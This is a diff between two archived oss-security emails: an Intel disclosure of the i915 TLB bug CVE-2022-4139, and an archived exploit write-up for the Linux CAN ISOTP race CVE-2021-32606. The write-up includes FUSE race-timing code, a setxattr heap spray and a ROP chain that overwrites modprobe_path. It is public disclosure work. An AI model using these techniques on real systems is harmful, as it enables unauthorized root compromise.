@@ -1,4 +1,9 @@
-Received: (qmail 9842 invoked by uid 550); 30 Nov 2022 13:18:29 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["21129" "Friday" "14" "May" "2021" "10:31:18" "+0200" "Solar Designer" "solar@openwall.com" nil "503" "Re: [oss-security] Linux kernel: net/can/isotp: race condition leads to local privilege escalation" nil nil nil "5" nil nil (number mark "U       solar@openwa May 14  503/21129 " thread-indent "\"Re: [oss-security] Linux kernel: net/can/isotp: race condition leads to local privilege escalation\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] Linux kernel: net/can/isotp: race condition leads to local privilege escalation" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 12245 invoked by uid 550); 14 May 2021 08:31:48 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,550 +12,520 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 21756 invoked from network); 30 Nov 2022 10:22:35 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1669803755; x=1701339755;
-  h=message-id:date:mime-version:from:subject:to:cc;
-  bh=ZXDEi0rYEcu5lBa5YNG7jRelfI7PZvb/j/p6c2WAwhc=;
-  b=FIyalei5mjbd5GosXsTPpKghpGr1fmT6v5ZLHa5FYFkguhN/r4UARggp
-   /BO5gquugkmxGbvqwsE0Rtsd0ZEoWat+YG0T/xh7tEiAugOkw5oCHTsGI
-   LpLdYsoFG9o1RiZJ2QY0pK9AR+WH2vN1MnikGFn27n7k4KVpDnhLdX3xb
-   2IUbqoFi8NRZtkxdvzWeOsI1DIIbT/3UmwVdrCptg351iZVikzOPLIYF+
-   0Fu+cpTDByImAZPUpMBMTtWsmVyY4oAMD6MfK0QyS+gWI+JHpAq8QKFiA
-   YAc+3DiysAw2GVLd4DhafLPDqVNcMVNaUGM3ufydp/Uhd3IrKnsNiXryZ
-   Q==;
-X-IronPort-AV: E=McAfee;i="6500,9779,10546"; a="295724331"
-X-IronPort-AV: E=Sophos;i="5.96,206,1665471600"; 
-   d="tar'49?scan'49,208,49,223";a="295724331"
-X-IronPort-AV: E=McAfee;i="6500,9779,10546"; a="676773667"
-X-IronPort-AV: E=Sophos;i="5.96,206,1665471600"; 
-   d="tar'49?scan'49,208,49,223";a="676773667"
-Content-Type: multipart/mixed; boundary="------------nomOFMI0Uix6mYcU6zhgBIbg"
-Message-ID: <c9089e54-bc0d-773c-233e-d63980ad49d4@intel.com>
-Date: Wed, 30 Nov 2022 11:22:16 +0100
-MIME-Version: 1.0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101
- Firefox/102.0 Thunderbird/102.5.0
-From: Andrzej Hajda <andrzej.hajda@intel.com>
+Received: (qmail 12128 invoked from network); 14 May 2021 08:31:32 -0000
+Date: Fri, 14 May 2021 10:31:18 +0200
+From: Solar Designer <solar@openwall.com>
 To: oss-security@lists.openwall.com
-Cc: Daniel Vetter <daniel@ffwll.ch>, Dave Airlie <airlied@gmail.com>,
- Joonas Lahtinen <joonas.lahtinen@linux.intel.com>,
- Jani Nikula <jani.nikula@linux.intel.com>,
- Tvrtko Ursulin <tvrtko.ursulin@linux.intel.com>,
- Linus Torvalds <torvalds@linux-foundation.org>,
- Marian Rehak <mrehak@redhat.com>,
- Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
- Vegard Nossum <vegard.nossum@oracle.com>
-Content-Language: en-US
-Organization: Intel Technology Poland sp. z o.o. - ul. Slowackiego 173, 80-298
- Gdansk - KRS 101882 - NIP 957-07-52-316
-Subject: [oss-security] Security sensitive bug in the i915 kernel driver (CVE-2022-4139)
+Cc: Norbert Slusarek <nslusarek@gmx.net>
+Message-ID: <20210514083118.GA18622@openwall.com>
+References: <trinity-10aeed49-cb96-47d9-818e-b938913e6fce-1620770433273@3c-app-gmx-bap63> <c80114dd-4a97-714d-232c-f4c6cf354332@gmx.net>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="NzB8fVQJ5HfG6fxh"
+Content-Disposition: inline
+In-Reply-To: <c80114dd-4a97-714d-232c-f4c6cf354332@gmx.net>
+User-Agent: Mutt/1.4.2.3i
+Subject: Re: [oss-security] Linux kernel: net/can/isotp: race condition leads to local privilege escalation
 
---------------nomOFMI0Uix6mYcU6zhgBIbg
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
+--NzB8fVQJ5HfG6fxh
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-Hi all,
+On Fri, May 14, 2021 at 01:52:04AM +0200, Norbert Slusarek wrote:
+> As Salvatore already mentioned, the assigned CVE ID is CVE-2021-32606.
+> The exploitation details are published in an article available on github
+> via this link:
+> https://git.io/JsYYB
 
-[This is a public disclosure of an issue reported 7 days ago to 
-linux-distros@vs.openwall.org. CVE-2022-4139 has been assigned to the 
-issue since.]
+Thanks, Norbert!
 
-Incorrect GPU TLB flush code has been discovered in i915 kernel driver.
-In some cases (Gen12 hardware with specific types of engine) the 
-engine's TLB is not flushed at all.
-Depending on whether the GPU is running behind an active IOMMU there are 
-two possible scenarios which can happen, due to stale TLB mapping:
-1. Without IOMMU - GPU can still access physical memory which could be 
-already assigned by OS to different process.
-2. With IOMMU - GPU can access any memory, if the malicious process is 
-able to create/reuse necessary IOMMU mappings.
+I'm attaching files from the above link to this message for archival,
+per this content guideline:
 
-It is currently not known if specific memory could be targeted, but 
-random memory corruption or data leaks are a known possibility.
+https://oss-security.openwall.org/wiki/mailing-lists/oss-security#list-content-guidelines
 
-All Intel integrated and discrete GPUs Gen12 are affected, including 
-Tiger Lake, Rocket Lake, Alder Lake, DG1, Raptor Lake, DG2, Arctic 
-Sound, Meteor Lake.
-Fix has already been developed and consists of fixing the method of 
-writing to specific registers.
-I am attaching a set of back-ported patches which implement the fix for 
-all affected stable branches (all since 5.4).
+"At least the most essential part of your message (e.g., vulnerability
+detail and/or exploit) should be directly included in the message itself
+(and in plain text), rather than only included by reference to an
+external resource.  Posting links to relevant external resources as well
+is acceptable, but posting only links is not.  Your message should
+remain valuable even with all of the external resources gone."
 
-This vulnerability has similar impact as CVE-2022-0330[1].
+Alexander
 
-I will try to follow Linux Security Process[2]. So I hope to send the 
-fix for public mailing list after 7 days.
+--NzB8fVQJ5HfG6fxh
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="cve-2021-32606.md"
 
-[1]:https://nvd.nist.gov/vuln/detail/cve-2022-0330
-[2]:https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html
+# CVE-2021-32606: CAN ISOTP local privilege escalation
 
-Regards
-Andrzej
+This article is about a recent vulnerability in the linux kernel labeled *CVE-2021-32606*. The
+vulnerable part of the kernel was the ISOTP CAN networking protocol in the CAN networking
+subsystem. In the following, I am going to cover the vulnerability and my exploitation
+approach which led to successful local privilege escalation to root.
+
+## Vulnerability 
+
+The vulnerability is a race condition which allowed to modify socket options after the socket was
+bound. For this reason, the race condition occurs between `isotp_setsockopt()` and `isotp_bind()`.
+In the case of the CAN ISOTP protocol, if socket options other than default shall be used,
+the new socket options have to be accordingly set with `isotp_setsockopt()` before binding the socket.
+Especially with the introduction of CAN_ISOTP_SF_BROADCAST support in commit ``921ca574cd38``, no
+further change of socket options is allowed, as this might result in other socket behavior than
+previously expected.
+
+Every ISOTP socket has the following ``struct can_isotp_options`` which can be changed
+with `isotp_setsockopt()`.
+
+```c
+struct can_isotp_options {
+        __u32 flags;            /* set flags for isotp behaviour.       */
+	...
+```
+
+When an ISOTP socket is about to be bound in `isotp_bind()`, the `flags` are checked against
+``CAN_ISOTP_SF_BROADCAST``. In case ``CAN_ISOTP_SF_BROADCAST`` is set, no CAN receiver will be
+registered. A CAN receiver is a feature which will be automatically run as a software interrupt in
+order to receive incoming CAN messages.
+
+```c
+static int isotp_bind(struct socket *sock, struct sockaddr *uaddr, int len)
+{
+	...
+	/* do not register frame reception for functional addressing */
+	if (so->opt.flags & CAN_ISOTP_SF_BROADCAST)
+		do_rx_reg = 0;
+	...
+	if (do_rx_reg)
+		can_rx_register(net, dev, addr->can_addr.tp.rx_id,
+				SINGLE_MASK(addr->can_addr.tp.rx_id),
+				isotp_rcv, sk, "isotp", sk);
+	...
+	so->bound = 1;
+	...
+```
+
+Above in `isotp_bind()`, we can see that `can_rx_register()` won't be called if
+``CAN_ISOTP_SF_BROADCAST`` is not set. In `isotp_setsockopt()`, we can either set or remove this flag.
+
+The following excerpt shows `isotp_setsockopt()` from `net/can/isotp.c`
+```c
+static int isotp_setsockopt(struct socket *sock, int level, int optname,
+			    sockptr_t optval, unsigned int optlen)
+{
+	struct sock *sk = sock->sk;
+	struct isotp_sock *so = isotp_sk(sk);
+	int ret = 0;
+
+	if (level != SOL_CAN_ISOTP)
+		return -EINVAL;
+
+	if (so->bound)							[1]
+		return -EISCONN;
+
+	switch (optname) {
+	case CAN_ISOTP_OPTS:
+		if (optlen != sizeof(struct can_isotp_options))
+			return -EINVAL;
+
+		if (copy_from_sockptr(&so->opt, optval, optlen))	[2]
+			return -EFAULT;
+		break;
+	...
+```
+
+If the socket is already bound ``[1]``, we return from the function earlier, as we cannot modify the
+socket options of a bound socket.
+In case the socket is not bound, ``struct can_isotp_options`` will be copied ``[2]`` from user space.
+
+Now consider the following race condition between `isotp_setsockopt()` and `isotp_bind()`:
+
+- `isotp_setsockopt()` is called and we pass the check at ``[1]`` since the socket is unbound.
+
+- `isotp_bind()` is by default called without ``CAN_ISOTP_SF_BROADCAST``, resulting in the
+  registration of a CAN receiver. In the end, ``so->bound`` will be set to ``1``.
+
+- The socket was just bound but we are still in `isotp_setsockopt()`. If the timing is right, we will
+  change ``struct can_isotp_options`` with `flags` set to ``CAN_ISOTP_SF_BROADCAST``. Notice that the copy
+  ``[2]`` will happen on an already bound socket.
+
+At this place, we now have a socket with a registered CAN receiver, but according to its newly
+set `flags` to ``CAN_ISOTP_SF_BROADCAST``, this shouldn't have happened.
+
+After a successful race condition, we now close the socket and `isotp_release()` is called.
+
+```c
+static int isotp_release(struct socket *sock)
+{
+	...
+
+	/* remove current filters & unregister */
+	if (so->bound && (!(so->opt.flags & CAN_ISOTP_SF_BROADCAST))) {		[1]
+		if (so->ifindex) {
+			struct net_device *dev;
+
+			dev = dev_get_by_index(net, so->ifindex);
+			if (dev) {
+				can_rx_unregister(net, dev, so->rxid,		[2]
+						  SINGLE_MASK(so->rxid),
+						  isotp_rcv, sk);
+				dev_put(dev);
+			}
+		}
+	}
+
+	...
+```
+
+The check at ``[1]`` assures that the CAN receiver will be unregistered if `flags` weren't set to
+``CAN_ISOTP_SF_BROADCAST``.
+But because we illegally changed `flags` after binding the socket, it is now assumed that we
+didn't register a CAN receiver so none will be unregistered.
+
+At this place, we now have closed the ISOTP socket, but we still have a registered CAN receiver.
+In case another socket sends messages to our previously freed socket, a softirq will call `isotp_rcv()`
+on the freed ``struct isotp_sock``, resulting in **use-after-free**.
+
+## Exploitation 
+
+In order to allow successful exploitation, the following conditions are required:
+
+- The kernel needs to come with config option ``CONFIG_USER_NS`` enabled. This option is needed to
+  set up a sandbox for the unprivileged user, allowing to autoload VCAN and ISOTP modules.
+  The first is needed to set up a CAN networking device for our ISOTP sockets, and the latter is
+  needed to create the aforesaid sockets.
+
+- An infoleak is needed in order to bypass KASLR and to get the address of the GS register. The
+  usage of the latter will be explained soon. In my case, I could trigger a kernel warning which
+  would effectively display the Oops message in kernel logs. Kernel logs can be read on
+  distributions which haven't restricted access to dmesg via ``CONFIG_SECURITY_DMESG_RESTRICT``.
+
+Exploitation is possible on machines with **SMEP**, **SMAP**, **KASLR** and **KPTI** enabled.
+
+### FUSE technique
+
+For this particular exploit, I originally wanted to use the userfault technique to reliably
+control the race condition. Due to userfault being recently disabled, I looked for other
+possibilities and stumbled upon a technique which was used by *Jann Horn* to control a race condition,
+in the past. I think because of userfault working well in the past, this technique might have not
+been frequently used as much, but it's still a worthy approach to make this particular exploit reliable.
+
+One of the drawbacks of the FUSE technique I see is that it might not come preinstalled on some
+distributions. On OpenSUSE Tumbleweed with XFCE desktop FUSE came preinstalled and was accessible
+to unprivileged users.
+Repeated tests have shown, that there is still a good chance to exploit this
+vulnerability **without** FUSE or userfault, but the reliability would potentially be decreased.
+
+In short, **FUSE** stands for **Filesystem in Userspace** and allows to mount self-made filesystems in a
+user-controlled directory. For this exploit, I used a template filesystem from libfuse called
+``hello` which was modified to be effectively used in this exploit.
+
+The following excerpt shows the `hello_read()` function from the hello filesystem
+```c
+static int hello_read(const char *path, char *buf, size_t size, off_t offset,
+                struct fuse_file_info *fi)
+{
+        /* wait inside isotp_setsockopt() */
+        sleep(2);						
+
+        int flags = CAN_ISOTP_SF_BROADCAST;
+        struct can_isotp_options opts;
+        size_t len = sizeof(opts);
+
+        memset(&opts, 0, sizeof(opts));
+        opts.flags = flags;
+
+        if (offset < len) {
+                if (offset + size > len)
+                        size = len - offset;
+                memcpy(buf, &opts + offset, size);
+        } else {
+                size = 0;
+        }
+
+        return size;
+}
+```
+
+In this case, any read associated with the hello filesystem will be redirected to `hello_read()`.
+Inside `hello_read()`, we `sleep()` for 2 seconds, effectively halting the kernel execution at
+`copy_from_sockptr()` in `isotp_setsockopt()`.
+```c
+	if (copy_from_sockptr(&so->opt, optval, optlen))
+		return -EFAULT;
+```
+
+In the meanwhile, `isotp_bind()` will finish and bind the socket, finally setting ``so->bound`` to ``1``.
+Then, we proceed with copying flags containing ``CAN_ISOTP_SF_BROADCAST`` to the kernel space.
+
+```c
+void setup_fusefs(void)
+{
+        fuse_fd = open("mnt/hello", O_RDWR);				       	   [1]
+        if (fuse_fd < 0)
+                die("failed to open fuse fd");
+
+        fuse_map = mmap(NULL, sizeof(struct can_isotp_options),
+				PROT_READ | PROT_WRITE, MAP_SHARED, fuse_fd, 0);   [2]
+
+        if (fuse_map == MAP_FAILED)
+                die("failed to map with fuse fs");
+}
+```
+
+In my exploit, I get a fd of the filesystem ``[1]`` and mmap memory ``[2]`` similarly to userfault.
+This `mmap()` will be associated with the previously opened ``fuse_fd``. As already mentioned,
+any copy from the kernel space from this mmap'ed memory will be handled by `hello_read()`.
+
+At this point, we have a properly set up FUSE filesystem which will help us to reliably win the race
+condition between `isotp_setsockopt()` and `isotp_bind()`.
+
+How does the **controlled** race condition scenario look like?
+
+- `isotp_setsockopt()` is called on an unbound socket.
+	- `copy_from_sockptr()` wants to copy `struct can_isotp_options` from the user space
+	- `hello_read()` is called and goes to `sleep()` for 2 seconds, kernel execution is now halted!
+
+- while we are in `setsockopt()`, we **now call** `isotp_bind()`
+	- ``CAN_ISOTP_SF_BROADCAST`` flag is **not** set, so a CAN receiver will be registered
+	- return from `isotp_bind()`, the socket is now successfully bound
+
+- during the 2 seconds `isotp_setsockopt()` was halted, we expect `isotp_bind()` to be completed
+	- `memcpy()` inside `hello_read()` will now copy the struct to kernel space
+	- we set the ``CAN_ISOTP_SF_BROADCAST`` flag for a bound socket!
+
+### Further exploitation
+
+As already mentioned, closing the socket won't unregister the CAN receiver and we cause a few
+use-after-free's inside `isotp_rcv()` whenever we send a message to the freed socket.
+
+My approach focuses on spraying the freed `struct isotp_sock` so we can reliably pass the
+checks in `isotp_rcv()` and call an overwritten function pointer. Because the struct is pretty big
+(on my machine it was 17432 bytes) and exceeds the biggest kmalloc cache `kmalloc-8k`,
+it won't be allocated in any of the generic SLAB caches.
+Instead, the page allocator will allocate it.
+
+Looking after a feasible spray primitive, I ended up with choosing `setxattr()`. This syscall
+was mainly used in combination with userfault, as `setxattr()` frees the buffer right after copying
+it. In fact, we could probably hold it with FUSE, but after repeated tests I noticed that `setxattr()`
+alone is also very reliable in this case. The most important thing with this approach is that `setxattr()`
+does not erase the buffer after freeing it, so the previously copied bytes will remain in memory.
+
+Theoretically, some other object could be allocated right after we sprayed the freed socket, but
+in practice it does not provoke any crashes and in the worst case we can simply rerun the exploit
+and try again. In the following, I will explain this further.
+
+```c
+static void isotp_rcv(struct sk_buff *skb, void *data)
+{
+	/* Strictly receive only frames with the configured MTU size
+	 * => clear separation of CAN2.0 / CAN FD transport channels
+	 */
+	if (skb->len != so->ll.mtu)							[1]
+		return;
+	...
+	switch (n_pci_type) {
+	...
+	case N_PCI_SF:
+		/* rx path: single frame
+		 *
+		 * As we do not have a rx.ll_dl configuration, we can only test
+		 * if the CAN frames payload length matches the LL_DL == 8
+		 * requirements - no matter if it's CAN 2.0 or CAN FD
+		 */
+
+		/* get the SF_DL from the N_PCI byte */
+		sf_dl = cf->data[ae] & 0x0F;
+
+		if (cf->len <= CAN_MAX_DLEN) {
+			isotp_rcv_sf(sk, cf, SF_PCI_SZ4 + ae, skb, sf_dl);		[2]
+	...
+```
+
+In the beginning of `isotp_rcv()`, the length of the received ``sk_buff`` is checked against ``so->ll.mtu``.
+The `skb->len` of the received message is by default `16`, so
+``so->ll.mtu`` also has to be `16`. If this is not the case, we return from the function.
+Because we control the whole ``struct isotp_sock`` with the `setxattr()` spray,
+we can set ``so->ll.mtu`` to `16`. This is also why this seemingly unreliable spraying approach is
+still very reliable: In case the spray will fail, it's very unlikely that `isotp_rcv()` will read
+exactly `16` at the position of ``so->ll.mtu``. For any rubbish value other than `16`, we will safely
+return from `isotp_rcv()` and we can try again.
+
+After the initial check ``[1]``, `isotp_rcv_sf()` will be called ``[2]`` to receive a so-called CAN
+single frame message in case the message length is <= 8.
+
+```c
+static int isotp_rcv_sf(struct sock *sk, struct canfd_frame *cf, int pcilen,
+			struct sk_buff *skb, int len)
+{
+	...
+	hrtimer_cancel(&so->rxtimer);							[1]
+	so->rx.state = ISOTP_IDLE;
+	...
+	if ((so->opt.flags & ISOTP_CHECK_PADDING) &&					[2]
+	    check_pad(so, cf, pcilen + len, so->opt.rxpad_content)) {
+		/* malformed PDU - report 'not a data message' */
+		sk->sk_err = EBADMSG;
+		if (!sock_flag(sk, SOCK_DEAD))
+			sk->sk_error_report(sk);					[3]
+		return 1;
+	}
+```
+
+At ``[1]``, one of the hrtimers is cancelled by calling `hrtimer_cancel()`. I won't cover hrtimers
+in this article in detail. All you have to know is that we need to overwrite the freed socket's memory
+in the place of ``so->rxtimer.base`` in order to prevent kernel crashes. ``struct hrtimer`` has a
+pointer to ``struct hrtimer_clock_base``. ``hrtimer_clock_base`` is defined per CPU core.
+Fortunately, the abovementioned `GS` register holds the address of one of the core's per-CPU data,
+and adding a constant offset to this address will give us a valid `struct hrtimer_clock_base`.
+
+After a couple of checks in `hrtimer_cancel()`, the socket's flags are checked ``[2]`` against
+``ISOTP_CHECK_PADDING``. These flags are exactly the ones where ``CAN_ISOTP_SF_BROADCAST`` is
+stored. We can provide this flag along with some other flags needed in `check_pad()`.
+The combination of the user-controlled message length and the padding flags results in the message
+being seen as malformed. Accordingly, the socket will call `sk_error_report()` ``[3]`` to report this issue.
+Just like we can control any single byte of ``struct isotp_sock``, it's also possible to
+overwrite the `sk_error_report()` pointer. At this point, we have successfully managed to achieve
+**arbitrary kernel execution**.
+
+One may ask, where are we supposed to forward the execution? Jumping to invalid places led to a
+kernel panic, but then I noticed that the `RDI` register stored the address of our freed ``struct isotp_sock``. I decided to perform a stack pivot to this address and start executing ROP gadgets. In
+order to take use of the ROP gadgets found in the vmlinux image, I use the leaked KASLR offset from
+the warning in kernel logs.
+When I assembled the ROP chain, I took into account that the space might not be enough and eventually
+some important data might be overwritten. Because of that, I almost immediately moved the stack
+pointer somewhere in the middle of the sprayed target where no data would explicitly be used by
+`isotp_rcv()`. This is possible because of the large size of `struct isotp_sock` which makes it
+feasible to place the payload inside the object.
+In this example, I place my extended ROP chain at offset 0x718.
+
+```c
+	/* overwrite sk_error_report() (offset 0x2b8) with stack pivot */
+	dst = (uint64_t *)(p + 0x2b8);
+	*dst = ROP_PUSH_RDI__JUNK__POP_RSP__RET + kaslr_offset;
+
+	/* ROP at isotp_sock + 0x8 */
+	*dst = ROP_RET_0x700 + kaslr_offset;
+	dst++;
+        /* jump to extended rop chain at isotp_sock + 0x10 */
+        *dst = ROP_RET + kaslr_offset;
+
+	/* extended rop chain */
+        rop = (uint64_t *)(p + 0x718);
+        *rop++ = ROP_POP_RAX__RET + kaslr_offset;
+        *rop++ = 0x782f706d742f; /* /tmp/x */
+        *rop++ = ROP_POP_RCX__RET + kaslr_offset;
+        *rop++ = MODPROBE_PATH + kaslr_offset;
+        *rop++ = ROP_MOV_RAX_INTO_RCX__RET + kaslr_offset;
+        *rop++ = ROP_POP_RAX__RET + kaslr_offset;
+        *rop++ = DO_TASK_DEAD + kaslr_offset;			[1]
+        *rop++ = ROP_JMP_RAX + kaslr_offset;
+```
 
 
+The following image shows the sprayed target to overwrite `struct isotp_sock`
 
---------------nomOFMI0Uix6mYcU6zhgBIbg
-Content-Type: application/x-tar; name="media-tlb.tar"
-Content-Disposition: attachment; filename="media-tlb.tar"
-Content-Transfer-Encoding: base64
+![alt text](https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606-spray.png "sprayed target")
 
-NS4xMC8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAADAwMDA3NzUAMDAwMTc1MQAwMDAxNzUxADAwMDAwMDAwMDAw
-ADE0MzQxNjI2MjAxADAwNzIwNgAgNQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB1c3RhciAgAGFoAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYWgAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAA1LjEwLzAwMDEtZHJtLWk5MTUtZml4LVRMQi1p
-bnZhbGlkYXRpb24tZm9yLUdlbjEyLXZpZGVvLWFuZC1jby5wYXRjaAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMDAwMDY2NAAwMDAxNzUxADAw
-MDE3NTEAMDAwMDAwMDI3MTAAMTQzNDE2MjYyMDEAMDIxNjM3ACAwAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAHVzdGFyICAAYWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABh
-aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZyb20gMTVhZWE5
-M2FhNTdkMTdjYzQ1Mjk4Mjc2YzY5NjEzZGM2NmY0NzdkNiBNb24gU2VwIDE3
-IDAwOjAwOjAwIDIwMDEKRnJvbTogQW5kcnplaiBIYWpkYSA8YW5kcnplai5o
-YWpkYUBpbnRlbC5jb20+CkRhdGU6IE1vbiwgMTQgTm92IDIwMjIgMTE6Mzg6
-MjQgKzAxMDAKU3ViamVjdDogW1BBVENIXSBkcm0vaTkxNTogZml4IFRMQiBp
-bnZhbGlkYXRpb24gZm9yIEdlbjEyIHZpZGVvIGFuZCBjb21wdXRlCiBlbmdp
-bmVzCk9yZ2FuaXphdGlvbjogSW50ZWwgVGVjaG5vbG9neSBQb2xhbmQgc3Au
-IHogby5vLiAtIHVsLiBTbG93YWNraWVnbyAxNzMsIDgwLTI5OCBHZGFuc2sg
-LSBLUlMgMTAxODgyIC0gTklQIDk1Ny0wNy01Mi0zMTYKCkluIGNhc2Ugb2Yg
-R2VuMTIgdmlkZW8gYW5kIGNvbXB1dGUgZW5naW5lcywgVExCX0lOViByZWdp
-c3RlcnMgYXJlIG1hc2tlZCAtCnRvIG1vZGlmeSBvbmUgYml0LCBjb3JyZXNw
-b25kaW5nIGJpdCBpbiB1cHBlciBoYWxmIG9mIHRoZSByZWdpc3RlciBtdXN0
-CmJlIGVuYWJsZWQsIG90aGVyd2lzZSBub3RoaW5nIGhhcHBlbnMuCgpDVkU6
-IENWRS0yMDIyLTQxMzkKU3VnZ2VzdGVkLWJ5OiBDaHJpcyBXaWxzb24gPGNo
-cmlzLnAud2lsc29uQGludGVsLmNvbT4KU2lnbmVkLW9mZi1ieTogQW5kcnpl
-aiBIYWpkYSA8YW5kcnplai5oYWpkYUBpbnRlbC5jb20+CkFja2VkLWJ5OiBE
-YW5pZWwgVmV0dGVyIDxkYW5pZWwudmV0dGVyQGZmd2xsLmNoPgpGaXhlczog
-NzkzOGQ2MTU5MWQzICgiZHJtL2k5MTU6IEZsdXNoIFRMQnMgYmVmb3JlIHJl
-bGVhc2luZyBiYWNraW5nIHN0b3JlIikKQ2M6IHN0YWJsZUB2Z2VyLmtlcm5l
-bC5vcmcKLS0tCiBkcml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5j
-IHwgNCArKysrCiAxIGZpbGUgY2hhbmdlZCwgNCBpbnNlcnRpb25zKCspCgpk
-aWZmIC0tZ2l0IGEvZHJpdmVycy9ncHUvZHJtL2k5MTUvZ3QvaW50ZWxfZ3Qu
-YyBiL2RyaXZlcnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMKaW5kZXgg
-YTMzODg3ZjI0NjRmYWYuLjVmODZkOWFhY2I4YTMxIDEwMDY0NAotLS0gYS9k
-cml2ZXJzL2dwdS9kcm0vaTkxNS9ndC9pbnRlbF9ndC5jCisrKyBiL2RyaXZl
-cnMvZ3B1L2RybS9pOTE1L2d0L2ludGVsX2d0LmMKQEAgLTc0NSw2ICs3NDUs
-MTAgQEAgdm9pZCBpbnRlbF9ndF9pbnZhbGlkYXRlX3RsYnMoc3RydWN0IGlu
-dGVsX2d0ICpndCkKIAkJaWYgKCFpOTE1X21taW9fcmVnX29mZnNldChyYi5y
-ZWcpKQogCQkJY29udGludWU7CiAKKwkJaWYgKElOVEVMX0dFTihpOTE1KSA9
-PSAxMiAmJiAoZW5naW5lLT5jbGFzcyA9PSBWSURFT19ERUNPREVfQ0xBU1Mg
-fHwKKwkJICAgIGVuZ2luZS0+Y2xhc3MgPT0gVklERU9fRU5IQU5DRU1FTlRf
-Q0xBU1MpKQorCQkJcmIuYml0ID0gX01BU0tFRF9CSVRfRU5BQkxFKHJiLmJp
-dCk7CisKIAkJaW50ZWxfdW5jb3JlX3dyaXRlX2Z3KHVuY29yZSwgcmIucmVn
-LCByYi5iaXQpOwogCX0KIAotLSAKMi4zNC4xCgoAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADUuMTUv
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAwMDAwNzc1ADAwMDE3NTEAMDAwMTc1MQAwMDAwMDAwMDAwMAAxNDM0
-MTYyNjIxNwAwMDcyMjIAIDUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdXN0YXIgIABhaAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAGFoAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
